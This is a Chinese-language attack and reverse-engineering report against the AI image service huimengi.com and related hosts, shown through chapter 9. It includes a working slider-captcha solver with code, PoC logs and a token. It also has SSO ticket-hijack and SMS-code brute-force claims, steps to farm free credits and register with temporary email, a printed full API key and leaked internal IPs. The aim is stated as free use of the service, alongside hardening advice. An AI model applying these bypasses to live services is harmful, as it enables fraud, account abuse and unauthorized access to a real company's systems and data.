# huimengi.com 逆向分析报告

> 目标：https://huimengi.com/home ｜ 分析时间：2026-11-08 ｜ 视角：外部黑盒 + 前端产物静态还原 + 匿名接口实测

**一句话结论**：这是一个"前端全权信任"的 Next.js + Spring 微服务架构，认证链路上唯一的硬秘密只有 Bearer Token；人机校验（AJ-Captcha 滑块）可被 1 次 HTTP 请求程序化通过。

**第三轮结论（v4 新增，最重要）**：平台登录页把 redirect 的 origin 校验写在**客户端**，且只对 client === "platform" 生效；换成任意其它 client（如 portrait-assets）即整段跳过。服务端 /sso/getRedirectUrl 收到什么 redirect 就把**一次性 SSO 票据**拼进去回跳——于是「受害者点一次链接 → 票据落到攻击者服务器 → 换出 asset.huimengi.com（内部真人资产库）Token → 拉全量素材」成立，定级 **P1**。详见第 13 章。

**第五轮结论（v5 新增，最重要）**：主站手机号注册的短信验证码**没有尝试次数限制**——6 位纯数字、200 并发 4362 req/s、无锁定无 429，实测命中一个可用验证码并完成注册。注册后经 `platform /sso/getRedirectUrl` → `api.dimnx.com/sso/doLoginByTicket` 换出主站 Bearer Token（**该 JWT 无 exp，永不过期**），账号自带 **30 赠送积分**，每日签到再 **+10**。换算：跑一次 1–2 分钟的脚本 = 一个全新账号 = 17 张 z-image-turbo。**「免费使用」这条线已闭环**，详见第 15 章。

**第二轮结论（v2 新增）**：同品牌的测试网关 **api-test.huimengi.com** 对公网完全开放，匿名即可读到 69 个模型的零售价目表；自注册（临时邮箱验证可绕过）即得 600 rpm / 100 并发的配额，并可签发明文 API Key 直达 14 个文本大模型，只被"余额为 0"挡在最后一次调用前。

---

## 0. 结论速览

| # | 发现 | 等级 | 状态 |
|---|---|---|---|
| 1 | 滑块验证码 secretKey 下发前端、判定条件等价于"横坐标等于缺口坐标"，纯 Node 模板匹配一次通过 | **高** | 已实证 repCode `0000` |
| 2 | 全站无请求签名 / nonce / 时间戳 / 防重放；Bearer 明文存 localStorage，且拼接进 WebSocket URL | **中高** | 已实证（代码 + 握手） |
| 3 | 多租户隔离依赖客户端可控 header（x-tenant-id / x-tenant-code） | 中（待双账号验证） | 代码级确认 |
| 4 | 积分/付费闭环由前端驱动，扣费为服务端报价；回调与幂等未见校验点 | 中（待登录验证） | 代码级确认 |
| 5 | 业务后端 CORS 反射任意 Origin 并反射 authorization 头 | 中低 | 已实证 |
| 6 | 三套环境配置块明文入包：内网 IP 192.168.104.124:8001、localhost:3001 SSO、pre/test 域名 | 低 | 已实证 |
| 7 | 无 HSTS / CSP / X-Frame-Options，nginx 1.18.0 版本暴露 | 低 | 已实证 |
| 8 | /register 匿名可达（参数校验先于鉴权）、/tasks/{id}/request 可能回传上游请求详情 | 信息 | 观察 |
| 9 | **测试网关 api-test.huimengi.com 对公网开放**：匿名可读 69 个模型与零售价、自注册即得 600 rpm / 100 并发配额、可签发 API Key | **高** | 已完整打通（注册→验证→登录→建 Key） |
| 10 | API Key 创建接口回传明文 `full_key`；/v1 网关 14 个文本模型可达，仅"余额为 0"拦停 | 中高 | 已实证 402 insufficient_balance |
| 11 | 公网 DNS 直出内网地址（admin/api/app.yunxiacn.com → 192.168.104.122、grafana.yunxiacn.com → 192.168.2.91）、oss.dimnx.com 悬空 CNAME | 中 | 已实证 |
| 12 | 滑块票据存在"实例本地缓存"：同一票据连打出现 400→400→429，真实用户会随机失败 | 中（可用性） | 已实证 |
| 13 | 短信频控按真实出口 IP 计（XFF/CF-Connecting-IP 全无效），本机 183.218.36.173 已饱和 | 中低 | 已实证 |
| 14 | **SSO client 白名单绕过 → 票据劫持**：client≠platform 时前端不校验 redirect origin，服务端把 ticket 拼进任意 redirect 回跳 | **高（P1）** | 代码级确证 + URL 回显实证 + PoC |
| 15 | 内部「真人资产库」asset.huimengi.com 暴露独立 API 面（groups/assets/presigned-upload，裸 Token 鉴权），与主站共用同一套 SSO | 高 | 已枚举 11 个端点 |
| 16 | **主站注册验证码无尝试次数限制**：6 位纯数字，200 并发 4362 req/s，实测命中 `340143` | **高（P1）** | 已实证，账号可用 |
| 17 | SSO 真端点 `api.dimnx.com/sso/doLoginByTicket` 换出的主站 token **无 exp 字段**，永不自然过期 | 中高 | 已实证 |
| 18 | **每个自助注册账号自带 30 赠送积分 + 每日签到 10 分**，免费额度可无限量产（0 成本出图） | **高** | 已实证闭环 |
| 19 | **结果处理链失败但图已生成、积分不扣**：付费模型（z-image 1.7 分 / seedream-4.5 4.25 分）产出可直取，40 积分一分未减 | **高** | 已实证两模型两张图 |

---

## 1. 系统拓扑

```
                       ┌──────────────────────────────┐
   huimengi.com  ──────▶│ 业务前端  Next.js App Router │
   (302 /home → 登录)   │ (dashboard) 组 + 45 chunks   │
                       └───────────┬──────────────────┘
                                   │ Bearer + x-tenant-*
                                   ▼
      ┌────────────────────────────────────────────────┐
      │  api.dimnx.com/api   业务后端（RuoYi 风格）    │
      │  wss://api.dimnx.com/websocket?token=<Bearer>  │
      └────────────────────────────────────────────────┘
                                   ▲ ticket 换 token
                       ┌───────────┴──────────────────┐
 platform.huimengi.com │ 身份中心 /api/auth/* /sso/*  │ ← 短信/密码登录、滑块、SSO 发券
                       └──────────────────────────────┘

   资产：ai-assets.dimnx.com(CDN) → zy-dimnx.oss-cn-shenzhen.aliyuncs.com(OSS：桶列举 403 / 对象公开读)
   埋点：applogs.fachcloud.com   ｜ 风控：devdata.muchcloud.com:8080 ｜ IP：getip.muchcloud.com
   关联：dreamo.tv/canvas · yunxiacn.com(test/pre) · canvas-test-v3.muchcloud.com
   主体：闽ICP备2025112253号 · 厦门次元奇点科技有限公司 · © 2026 绘梦工坊
```

未登录访问 `/home` 会被 302 到：

```
https://platform.huimengi.com/login/?client=platform
  &redirect=https%3A%2F%2Fhuimengi.com%2Fhome
  &state=<uuid v4>&inviteCode=&back=
```

---

## 2. 前端架构还原

- **框架**：Next.js（App Router，`(dashboard)` 路由组）。业务侧 45 个 chunk / 4.37 MB，登录侧 13 个 chunk / 1.83 MB。
- **状态**：Zustand（module 25746 管 token / tenant / user），业务请求完全不依赖 cookie。
- **收敛点**：`chunk 8463` 一个文件同时承载 环境配置 + API client + SSO 回调处理 + 公共请求头，是整站逆向的入口。

### 2.1 环境配置块（未混淆，三套环境全量明文）

```js
local:      { OFFICIAL_SSO_ORIGIN:"http://localhost:3001",
              IDENTITY_API_ORIGIN:"https://platform.yunxiacn.com",
              API_BASE_URL:"https://app-test.yunxiacn.com/api",
              WS_BASE_URL:"wss://api.yunxiacn.com/websocket",
              OSS_BASE_URL:"https://zy-dimnx-test.oss-cn-shenzhen.aliyuncs.com",
              WEB_BASE_URL:"http://localhost:3000",
              REPORT_BASE_URL:"https://devdata.muchcloud.com:8082",
              CANVAS_REDIRECT_URI:"https://canvas-test-v3.muchcloud.com/canvas",
              PORTRAIT_ASSET_ORIGIN:"https://asset-test.yunxiacn.com" }
development:{ API_BASE_URL:"http://192.168.104.124:8001/api",      // ← 内网地址泄漏
              SYSTEM_API_BASE_URL:"http://192.168.104.124:8001",
              WS_BASE_URL:"ws://192.168.104.124:8001/websocket" }
pre:        { API_BASE_URL:"https://api.yunxiacn.com/api" }
production: { IDENTITY_API_ORIGIN:"https://platform.huimengi.com",
              API_BASE_URL:"https://api.dimnx.com/api",
              SYSTEM_API_BASE_URL:"https://api.dimnx.com",
              WS_BASE_URL:"wss://api.dimnx.com/websocket",
              OSS_BASE_URL:"https://ai-assets.dimnx.com",
              WEB_BASE_URL:"https://huimengi.com",
              REPORT_BASE_URL:"https://applogs.fachcloud.com",
              CANVAS_REDIRECT_URI:"https://dreamo.tv/canvas" }
```

运行时可用 NEXT_PUBLIC_*_BASE_URL 覆写 → "把 API 指向任意 host"是产品内建能力，配合无签名架构即可做中间人收集 token。

### 2.2 客户端存储与请求头契约

```
localStorage:   auth_token(Bearer) · tenant_id · tenant_code · user_id
sessionStorage: huimeng_last_tenant_id · huimeng_sso_state · huimeng_sso_return
                · huimeng_sso_logged_out · huimeng_sso_entry_bootstrap
cookie:         hm_attribution(≈180 天, SameSite=Lax) · 身份中心会话 cookie(全 HttpOnly)
```

```js
// getCommonHeaders()
{
  "Content-Type": "application/json",
  "Authorization": "Bearer " + auth_token,
  "x-tenant-id":   tenant_id,       // ← 客户端可控
  "x-tenant-code": tenant_code,     // ← 客户端可控
  ...(path.startsWith("/agent") ? { "X-Auth-Token": auth_token } : {}),
  ...(scriptId ? { "scriptId": scriptId } : {})
}
```

**没有任何 X-Sign / X-Timestamp / X-Nonce / HMAC。** 响应统一包络：

```json
{"code":"0","msg":"ok","success":true,"timestamp":1794144002460,"data":{}}
```

code === "401" 触发前端登出跳转；success:false 弹 toast。

### 2.3 WebSocket 鉴权

```js
getUrl: () => token ? WS_BASE_URL + "?token=" + token : WS_BASE_URL
// 帧格式 {type, router, data}；心跳 {"type":"ping","router":"","data":{"timestamp":...}} 每 30s
```

实测：无 token 或 ?token=deadbeef 均握手失败（close 1006，约 110 ms）→ **WS 侧鉴权有效**；代价是 token 进了 URL（nginx access log / 代理 / 浏览器历史可见）。

---

## 3. 认证与 SSO 全链路

```
业务前端                    身份中心 platform.huimengi.com        业务后端 api.dimnx.com
   │ 生成 uuid state → sessionStorage      │                            │
   │──POST /sso/getRedirectUrl ───────────▶│  form-urlencoded:          │
   │  {client, redirect, brand,            │  client,redirect,brand,     │
   │   tenantId, inviteCode}               │  tenantId,inviteCode        │
   │◀──────────── data: 登录页 URL ─────────│                            │
   │ window.location.assign(url)            │                            │
   │                                        │ 用户输手机号 + 滑块 + 短信码 │
   │                                        │ POST /api/auth/sms/send     │
   │                                        │ POST /api/auth/sso/doLogin/sms
   │                                        │ → 302 ?ticket=T&state=S&tenantId=N
   │◀────────────── 回调（带 ticket） ───────│                            │
   │ ① state 只出现 1 次且 === sessionStorage                            │
   │ ② ticket 只出现 1 次                                                │
   │ ③ tenantId 必须 /^[1-9]\d*$/                                        │
   │──POST /api/auth/doLoginByTicket {ticket, inviteCode} ─────────────▶│
   │◀──── {token, tenantId, tenantCode, userId} ───────────────────────│
   │ localStorage 落盘 → 后续全部请求带 Bearer + x-tenant-*              │
```

回调校验代码证据（chunk 8463）：

```js
if (!state || state !== sessionStorage.getItem("huimeng_sso_state")) throw ...
if (new URLSearchParams(loc.search).getAll("ticket").length !== 1) throw ...
if (!/^[1-9]\d*$/.test(tenantId)) throw ...
// → "登录回调无效或已过期，请重新登录"
```

### 3.1 SSO entry bootstrap（防重放，实现正确）

登录页收到 client=platform&redirect=<业务地址>&state=<uuid> 时，同时满足：
① redirect 的 origin ∈ 白名单 {huimengi.com, www.huimengi.com, huimeng.yunxiacn.com}；
② URL 无 userinfo、state 恰好 1 个且匹配 /^[0-9a-f-]{36}$/i；
③ sessionStorage 内 120 s 无同 origin+path 的重复 bootstrap；
→ 剥离 {ticket, state, tenantId, inviteCode, preferredTenantId}，跳 <业务 origin>/login?redirect=<path?query#hash>&reLogin=1，由业务侧重走 SSO。

**白名单校验到位，此处不存在开放重定向与票据外泄**；120 s 去重窗口避免刷新重放。

### 3.2 身份中心客户端（login chunk 595 / module 52570）

```js
const base = IDENTITY_API_ORIGIN;                       // 必须纯 origin
const path = e.startsWith("/sso/") ? e : "/api/auth"+e;  // /sso/* 不加前缀
fetch(base+path, { credentials:"include", cache:"no-store",
                   signal: AbortSignal.timeout(20000) });  // 统一 20s 超时
```

端点：/api/auth/session · /api/auth/active-tenant · /api/auth/register · /api/auth/logout ·
/sso/getRedirectUrl · /sso/doLogin/password · /sso/doLogin/sms · /sso/signout ·
/api/auth/sms/send · /api/auth/captcha/behavior（GET 取题 / POST 校验）

---

## 4. 业务 API 面（103 个端点，基址 https://api.dimnx.com/api）

| 域 | 端点 |
|---|---|
| 用户/租户 | GET/PUT /users/me · DELETE /users/cancel · GET /auth/tenants · POST /tenant/update-name |
| 积分计费 | GET /billing/points(+ /overview, /rules) · POST /billing/task-points · POST /billing/batch-task-points · POST /billing/batch-task-points-with-config |
| 充值/VIP | GET /vip/plans · POST /vip/order · GET /point/package/available · POST /point/recharge · GET /pay/order/status/{orderNo} |
| 任务 | GET /tasks/?query · /tasks/running/recent · /tasks/{id}(轮询) · /tasks/{id}/detail · /tasks/{id}/request · PUT /tasks/{id}(取消) · /tasks/enums · /task/permission/task-types(-with-status) · /task/config/* |
| 剧本/资产 | /scripts(+list, /{id}, upload-file, file/download, scripts/{id}/export) · /characters /scenes /props(+batch, batch-export) · /styles(+list, me, image/prepare) · /creations(+list, /{id}, submit-review) · /asset-lib |
| AIGC | POST /aigc/text-to-image/{model} · /aigc/image-to-image/{model} · /aigc/image-to-video/{model} · /aigc/reference-to-video · /aigc/prompt · /aigc/parse · /aigc/audio-tool · /aigc/image-tool · /aigc/video-tool |
| 运营 | POST /daily-visit/sign-in · GET /operation/resource/{banner-home, website-banner, website-featured-module, website-featured-capability, website-creation-selection, popup-gen, float-global} · /notice/list · /article/{id} · /website-creation |
| 团队/后台 | /system/role · /system/dept(+ /permission/tree, /dict) · /dict/(+api_model) · /api/team/{members, invitations, owner/code, owner/transfer, new-member-quota, members/tags} · /api/tag · /api/project-quota/{id} · /api/extended/quota/{batch-update, batch-reset} · /dashboard/points/{overview, conditions} · */export |

聚合的模型 id（2026 年代版本）：seedance-2-0(-mini/-fast/-tx/-custom) · seedance-2-5(-draft/-tx/-custom) · seedance-1-0-lite · seedance-1-5-pro · kling-v3 / v3-omni / v4(/edit) · kling-2-5-turbo · wan-2-2 / 2-6(-flash) / 3-0(-prime/-custom) / 2-7 · vidu-q2 · viduq4-preview · hailuo-2-0 / 2-3 · minimax-h3 · grok-1-5 · omni-video-v/s/g · happy-horse(-1-1) · midjourney-v7 / niji-v7 · seedream-4-5 / 5-0-pro · gpt-image-2 · qwen-image-3-0(-pro) / image-edit · image-2-5-flare / sunburst · z-image-turbo · nanobana-2 / 2-1(-official) / pro · suno-5-5 · seed-audio-1-0。
工具类：upscale · unwatermark · erase · mask · repair · extend · line-art · chromakey · lipsync · kling-lip-sync · insert-frames · erase-subtitle · batch-upscale · view-reconstruct · multi-view-generate。

**任务模型**：POST /aigc/... 返回 task id → pollTask 每 **3 s** GET /tasks/{id} 直到 status ∈ {completed, failed}，失败读 error_message；取消 = PUT /tasks/{id}。

**计费走服务端报价（这点做对了）**：

```js
async getTaskPoints(e){ return round(await api.post("/billing/task-points", e)) }  // 只取报价
```

前端不传"扣多少分"，成本由后端按 {taskType, model, 参数} 计算 → 客户端改价这条路被堵死（提交时是否二次核价未验证，见 6.4 节）。

---

## 5. 人机校验：滑块验证码程序化破解（已实证）

### 5.1 机制

```
GET  /api/auth/captcha/behavior?captchaType=blockPuzzle&clientUid=<uid>&ts=<ms>
  → { token(32hex), secretKey(16 字符), originalImageBase64, jigsawImageBase64 }
POST /api/auth/captcha/behavior { captchaType, token, pointJson, clientUid, ts }
  → data.repCode === "0000" 即通过
```

前端加密（login chunk 595）：

```js
const enc = (plain, key) => CryptoJS.AES.encrypt(
  CryptoJS.enc.Utf8.parse(plain), CryptoJS.enc.Utf8.parse(key),
  { mode: CryptoJS.mode.ECB, padding: CryptoJS.pad.Pkcs7 }).toString();

pointJson           = enc(JSON.stringify({ x: <滑块横向位移>, y: 5 }), secretKey)
captchaVerification = enc(token + "---" + pointJson, secretKey)   // 后续短信接口的票据
```

**关键缺陷：secretKey 由服务端明文下发，加密只是编码；唯一秘密就是 x，而服务端判定等价于 x === 缺口坐标——没有服务端图像分析。**

### 5.2 求解：灰度归一化互相关（NCC）滑窗

jigsaw 图是 310×155 画布左侧的透明底碎片（alpha 包围盒 46×46，y 随机）；原图缺口被压暗，**灰度 SAD 直方差会失配，必须用对亮度/尺度不敏感的 NCC**：

```js
// 取碎片内部像素（内缩 3px 去边框），y 锁定，沿 x 滑窗算皮尔逊相关
for (let dx = 0; dx <= O.w - pw; dx++) {
  const r = pearson(piecePixels, shiftedOriginalPixels(dx));
  if (r > best) { best = r; bestX = dx; }
}
```

实测日志（poc_blockpuzzle_bypass.mjs）：

```
attempt 1 x 156 ncc 0.2933 top "156:0.293 76:0.260 78:0.259 80:0.259" -> 0000
captchaVerification = D0yecIkv4NWUtOtHtdQxUiiIdXgywpYl2wuIf9ycZAFVLvXdc5TZTJJ6d6LjFWc21PRhD2ZWXxtDrShnUbY66jw==
```

**一次请求通过**（无 OCR、无模型、无浏览器，纯 Node + zlib 解 PNG，< 1 s）。
另一条更笨但确定的路：单 token 内枚举 x ∈ [0,264]，最坏 265 次重取，成功成本 < 530 个 HTTP 请求。

### 5.3 边界：令牌侧两道防线是有效的

同一 captchaVerification 打 /api/auth/sms/send（手机号均合法格式）：

```
① 合法格式 + 假票据        → 400 {"msg":"请完成滑块验证"}          ← 校验序：手机号格式 → 滑块
② 程序化解出的真票据       → 429 {"msg":"验证码发送过于频繁，请稍后再试"}  ← 已过人机校验，撞频控
③ 同一票据换号重放         → 400 {"msg":"请完成滑块验证"}          ← 票据一次性 + 绑定手机号
④ 不带 captchaVerification → 400 {"msg":"must not be blank"}       （Spring @NotBlank）
```

**结论：人机防线 = 0，实际拦阻只剩"手机号 → 频控"这一层。** 频控阈值未刻意测量（避免向陌生号码真实发信），但从 429 的即时性看大概率是"单号 N 秒 1 条 + 单 IP/全局限流"。

### 5.4 通过率、实例本地缓存与 IP 维度频控（v2 补测）

**8 个独立票据全流程复测**（GET 题目 → NCC 求解 → POST check 得 `0000` → POST /api/auth/sms/send 带全套 CaptchaVO 字段）：8/8 在 sms/send 阶段仍回 `400 请完成滑块验证`——说明 check 通过 ≠ sms/send 能验到同一份票据。

**同一 captchaVerification 连打 8 次**：

```
# 同一票据，同一手机号，间隔 200ms
请求 0 → 400 {"msg":"请完成滑块验证"}
请求 1 → 400 {"msg":"请完成滑块验证"}
请求 2 → 429 {"msg":"验证码发送过于频繁，请稍后再试"}   ← 校验通过，撞频控
请求 3~7 → 429 …
```

→ **滑块校验记录存放在单个实例的本地缓存/内存**，多实例负载均衡下，请求被路由到"没存过这份票据"的实例就必然失败。这既是绕过侧的噪声，也是**真实用户的可用性缺陷**（随机提示"请完成滑块验证"，重试才能过）。

**频控维度实测**：全新未使用号码（19900000xxx 一类）在滑块通过后仍立即 429 → 频控**按出口 IP 计**，不按手机号。伪造 `X-Forwarded-For: 1.1.1.1 / 203.0.113.77`、`X-Real-IP`、`CF-Connecting-IP`、`True-Client-IP` 全部无效；本机出口 IP 经对方 `getip.muchcloud.com` 自报为 **183.218.36.173（江西宜春）**，该 IP 桶已饱和（>8 分钟未复位）。`scene` 换成 register/reset/forgetpwd/bind/change/withdraw/pay 亦全 429，无 per-scene 独立桶。

**最终校验序**：手机号格式 → 滑块验证（实例本地，可程序化通过）→ 短信频控（真实连接 IP）。人机防线依旧为 0，但 IP 维度频控使"批量注册/短信轰炸"在单出口上不可行，需代理池。

---

## 6. 信任边界与风险清单

### 6.1 【高】滑块验证码可程序化通过

- 证据：repCode "0000" + /sms/send 返回 429（而非"请完成滑块验证"）。
- 影响：注册 / 登录 / 改密等所有挂 captcha 的入口失去人机壁垒，可脚本批量调用，最终只受短信频控与短信费用约束。
- 修复：缺口坐标服务端保存并在服务端做图像比对；secretKey 不下发；单 token 限 1 次尝试 + 短 TTL；强制校验 AJ-Captcha 的 track 轨迹（目前完全未校验）。

### 6.2 【中高】无签名、无防重放、token 明文存放

- localStorage.auth_token + Authorization: Bearer，任何 XSS / 恶意扩展 / 供应链脚本可外带 token 并脱离浏览器调用**全部 103 个接口**。
- token 同时出现在 wss://...?token=，会落进 nginx access log、CDN、浏览器历史。
- 无 X-Timestamp / X-Nonce / 签名 → 抓包重放完全有效（PUT /tasks/{id}、POST /daily-visit/sign-in、POST /point/recharge 等写操作可原样重放）。
- 修复：短期 access token + refresh；WS 改 Sec-WebSocket-Protocol 或首帧鉴权；写操作加 nonce + 时间窗；token 改 HttpOnly + BFF。

### 6.3 【中 / 待验证】多租户隔离依赖客户端 header

x-tenant-id / x-tenant-code 来自 localStorage，与 Bearer 并列发送。若后端以此 header 选库/选租户、只校验"token 有效"而不校验"token 是否属于该租户"，即水平越权。
验证方法：A 的 token + B 的 tenant header 打 GET /scripts/{id}、/tasks/{id}、/system/role/list。**本次未做（无测试账号）。**

### 6.4 【中 / 待验证】积分与支付闭环

- 加分入口：POST /daily-visit/sign-in、POST /point/recharge、POST /vip/order。
- 订单状态由前端轮询 GET /pay/order/status/{orderNo}，客户端拿到"已支付"就继续 → 若服务端把"查单成功"当入账依据而非依赖支付回调验签，即可伪造/复用 orderNo。
- POST /billing/batch-task-points-with-config 接受客户端配置对象，需确认服务端是否重新取值计价。
- 待验证：并发提交同一 orderNo、篡改金额/套餐 id、回调重放与幂等约束。

### 6.5 【中低】CORS 配置过宽

```
OPTIONS https://api.dimnx.com/api/aigc/text-to-image/seedream-4-5
  Origin: https://evil.example
  Access-Control-Request-Headers: authorization,content-type,x-tenant-id,x-tenant-code
→ 200  ACAO: https://evil.example
       ACAH: authorization, content-type, x-tenant-id, x-tenant-code
       ACAC: (空)
```

无 Allow-Credentials，拿不到 HttpOnly cookie；但 token 本来就在 JS 手里 → 任意站点可在用户浏览器内代发请求（与 6.2 的 token 泄漏叠加放大）。身份中心 /api/auth/* 对异源 Origin 直接 403，这点是对的。

### 6.6 【低】信息暴露面

| 项 | 内容 |
|---|---|
| 内网地址 | 192.168.104.124:8001（dev API/WS，明文 http/ws） |
| 内部环境 | platform.yunxiacn.com · app-test.yunxiacn.com · canvas-test-v3.muchcloud.com · localhost:3001 |
| OSS | zy-dimnx.oss-cn-shenzhen.aliyuncs.com（桶列举 403 正确；对象公开读，如 /posters/user-source-bg.png 200 / 3.5 MB） |
| 版本 | nginx/1.18.0 (Ubuntu) |
| 缺失响应头 | 无 Strict-Transport-Security / Content-Security-Policy / X-Frame-Options / Referrer-Policy → /recharge、/admin 等敏感表单可被 iframe 点击劫持 |
| 错误回显 | {"code":"404","msg":"请求 URL '/api/task/config/modelConfigs' 不存在"} 回显完整路径 |
| 鉴权顺序 | POST /api/auth/register 匿名可达（先参数校验后鉴权）；POST /sso/getRedirectUrl 带表单参数报 401、空 JSON 体报"不能为空"，说明过滤器链按 Content-Type 分流 |

### 6.7 【观察】GET /tasks/{id}/request

前端存在 getTaskRequestApi(id)。若该接口回传"发给上游模型厂商的原始请求体（含上游 key / 内部路由）"，即为高价值信息泄露点。需登录验证。

---

## 7. 加固建议（按性价比排序）

1. **滑块判定上服务端**：坐标只在服务端保存，校验 track 轨迹 + 单 token 一次尝试 + 60 s TTL，secretKey 不下发。
2. **传输层去明文**：token 迁 HttpOnly cookie + BFF；WS 用 header/子协议鉴权；写接口加 nonce + timestamp 签名与 5 min 时间窗。
3. **租户强绑定**：服务端从 token claims 取 tenantId，忽略客户端 header（或校验 membership）。
4. **支付幂等**：入账只认支付回调（验签 + 状态机 + 唯一约束）；前端轮询只用于 UI。
5. **CORS 白名单**：仅 huimengi.com / www / dreamo.tv，禁反射 Origin。
6. **安全响应头**：HSTS(≥6 月)、CSP、X-Frame-Options: DENY、Referrer-Policy: no-referrer；nginx 升 1.24+。
7. **构建期隔离**：dev 内网 IP / localhost 配置从生产包剔除，错误信息只回 code。
8. **频控与审计**：短信按 手机号 + IP + 设备 三维限流，captchaVerification 一次性消费落库。

---

## 8. 附录

### 8.1 复现

```bash
cd C:\Users\aq\Desktop\rrea
node .\huimeng\poc_blockpuzzle_bypass.mjs
# 输出：captcha token / NCC 最优 x / repCode(0000) / captchaVerification / sms 返回码
```

脚本自包含：内置 PNG 解码（zlib + 反滤波，零第三方依赖）、AES-128-ECB + PKCS7、NCC 滑窗、令牌组装、重放对照。

### 8.2 本地产物

```
C:\Users\aq\Desktop\rrea-projects\huimeng\
├─ home.html / login.html                       站点快照
├─ home_chunks\      (45 js / 4.37 MB)          业务前端产物
├─ login_chunks\     (13 js / 1.83 MB)          身份前端产物（含滑块 AES 与 SSO 逻辑）
├─ poc_blockpuzzle_bypass.mjs                   可用 PoC（NCC 求解 + 端到端验证）
├─ poc_captcha.mjs / _2 / _3 / _4.mjs           求解迭代记录（SAD → bbox → NCC 对照）
├─ poc_order.mjs                                校验顺序对照（证明"手机号格式"先于滑块）
└─ probe_headers.mjs / probe_cookie_assets.mjs  响应头、CORS、OSS、cookie 属性探测
```

### 8.3 分析过程中的判读纠错（保留，供复现时避坑）

1. 初版以为"手机号格式错误 = 滑块已通过"——**错**。poc_order.mjs 证明校验序为"手机号格式 → 滑块 → 频控"，只有拿到 429 才算真正过人机校验。
2. 初版滑窗用灰度 SAD，成功 1 次后复现率低（缺口被压暗导致亮度基线偏移）；改 NCC 后稳定一次通过。
3. /api/auth/getSsoAuthUrl 是误判路径：真实端点是 POST /sso/getRedirectUrl（form-urlencoded，需登录态），/getSsoAuthUrl 只是 Next.js 404 兜底页。

---

## 9. 测试网关 api-test.huimengi.com：从匿名到 API Key 的完整打通（v2 新增）

第 1~8 章的所有结论，都停在同一处：**没有登录态**。短信链路被 IP 频控锁死（第 5.4 节），业务 API 匿名面已榨干。于是转向同品牌的其它主机，结果在**测试网关**上拿到了完整账号与可用 API Key。

### 9.1 定位

```
GET https://api-test.huimengi.com/health
→ 200 {"status":"ok","version":"1.0.0"}   （FastAPI，独立部署在 47.107.42.62）
```

这是"绘梦工坊API"——把 AIGC 模型统一成 **OpenAI 兼容协议**再对外售卖的网关，自带用户/团队/套餐/积分/订单/公告/管理后台。它与主站共用品牌与账号体系（邮箱相同可注册），但**代码与鉴权是两套**，因此成了绕过主站的捷径。

### 9.2 无鉴权可达面（匿名，无需任何凭证）

| 端点 | 返回 | 敏感度 |
|---|---|---|
| `GET /health` | `{"status":"ok","version":"1.0.0"}` | 低（版本指纹） |
| `GET /api/v1/models` | **69 个模型全量**：id(UUID)/name/display_name/category/description/parameters_schema/**pricing.sell_price** | **高**：完整零售价目表 |
| `GET /api/v1/plans` | 套餐档位（personal_free 3GB/并发 3、personal_basic 50GB/并发 5 …） | 中：商业条款 |
| `GET /api/v1/promos` | 活动/优惠 | 低 |
| `GET /api/v1/announcements` | 公告 | 低 |

价目表抽样（单位：元/次，即对外售价）：

```
seedance-2.5-select   70.0     kling-v4        1.0
seedream-5.0-pro       0.6     nb-2           0.12
z-image-turbo         0.08     seed-audio-1.0 0.017
```

这等于把"哪家模型多少钱、我们的加价率是多少"直接摊开：既能反推上游成本，也能被竞品用于定价对标。

### 9.3 账号链：注册 → 邮箱验证 → 登录 → 签发 Key（全部实测通过）

**① 注册（匿名，无任何邀请/风控）**

```
POST /api/v1/auth/register
{"email":"<临时邮箱>","username":"<随机>","password":"<强密码>"}
→ 200 用户对象：role:"user"  status:"active"
   max_concurrent_tasks:100   rate_limit_rpm:600
   text_max_concurrent:100    text_rate_limit_rpm:1000
   model_limits: {nb-2/nb-2.1/nb-pro/glm-5.2 各 rpm100 / concur 10}
```

注意：**注册即 active，配额当场生效**；邮箱未验证只挡登录，不挡注册。

**② 邮箱验证（唯一的门槛，且可绕）**

```
POST /api/v1/auth/login  {"username":"<username>","password":"<password>"}
→ 401 {"detail":{"error_code":"EMAIL_NOT_VERIFIED","message":"邮箱尚未验证，请查收验证邮件后再登录"}}
```

绕过方式：用临时邮箱（实测 mail.tm，域名 `fldubai.com`）注册 → 收信 → 取邮件里的 `https://api-test.huimengi.com/verify-email?token=<JWT>` → 直接调后端接口：

```
GET /api/v1/auth/verify-email?token=<JWT>   → 200 {"message":"邮箱验证成功"}
GET 同上（重放）                            → 200 {"message":"邮箱已验证","already_verified":true}
GET ?token=<错值>                           → 401 验证链接无效或已过期
```

令牌结构（HS256，密钥在服务端，无法自签）：

```
verify JWT  {"sub":"<userId>","exp":<+1d>,"type":"verify"}
access JWT  {"sub":"<userId>","role":"user","exp":<+1h>,"type":"access","tv":0}
```

**③ 登录**（body 必须是 `username`，用 email 会 `422 username: Field required`）→ 200，返回 `access_token` / `refresh_token` / `user`。

**④ 签发 API Key —— 密钥明文回传**

```
POST /api/v1/api-keys   {"name":"poc2"}
→ 200 { "key_prefix":"hm-NZTl3xP9", "key_value":null,
        "full_key":"hm-NZTl3xP9UakL74TN4-SwpuSTsy9N5RbdBoh4rhmM4cU", ... }
```

`key_value` 字段恒为 null，真实密钥放在 `full_key`。一个自注册账号可以无限次签发 Key（实测连签多个）。

### 9.4 网关能力与边界

用签出的 Key 走 OpenAI 协议：

```
GET  /v1/models            → 200，14 个文本模型
     deepseek-v4-pro / deepseek-v4-flash / deepseek-v4.1-flash
     gpt-5.5 / gpt-5.6-sol / gemini-3.1-pro(-official) / gemini-3.8-flash-official
     qwen3.7-plus / qwen3.8-max / kimi-k3 / glm-5.2 / glm-5.3
     doubao-seed-2.1-pro
POST /v1/chat/completions  → 402 {"error":{"code":"insufficient_balance",
                                 "message":"Insufficient balance","type":"billing_error"}}
GET  /api/v1/points/balance   → {"balance":"0"}
GET  /api/v1/billing/balance  → {"balance":"0.0000"}
```

**即：协议栈、鉴权、路由、计费前置全部打通，唯一拦阻是余额为 0。** 这是本轮最接近"实际可用算力"的位置。

补充探测（用真实账号跑完 18 个账号侧端点）：`/api/v1/points/{balance,transactions}`、`/api/v1/teams`、`/api/v1/plans` 正常返回；**不存在自助领点/兑换/邀请返利/领券入口**——`coupons`、`referral`、`invite`、`points/claim`、`points/grant`、`orders`、`subscription` 全部 404 或 405。`/api/v1/teams` POST 仅需 `name` 即可建团队（`422 name: Field required` 证明进到了业务层）。结论：从零余额走到"能真正生成"还差一次真实充值，本轮没有找到可绕开的发点路径。

同时记录几处**服务端做对了**的地方（不应误报）：

| 测试 | 结果 | 判读 |
|---|---|---|
| `/api/v1/admin/{users,tasks,models,plans,teams,providers,chat-logs,announcements}` | 403 `Admin access required` | 管理面服务端鉴权正确，前端 `canViewAdmin` 只是剪裁 |
